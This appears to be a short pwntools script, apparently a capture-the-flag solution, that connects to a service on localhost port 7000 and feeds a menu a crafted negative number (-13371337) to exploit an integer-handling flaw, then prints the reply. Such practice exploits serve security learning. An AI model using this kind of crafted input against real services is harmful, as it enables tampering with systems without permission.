from pwn import *

p = remote('localhost', 7000)

p.send(b'1\n-13371337\n2\n3\n')
print(p.recv())
 
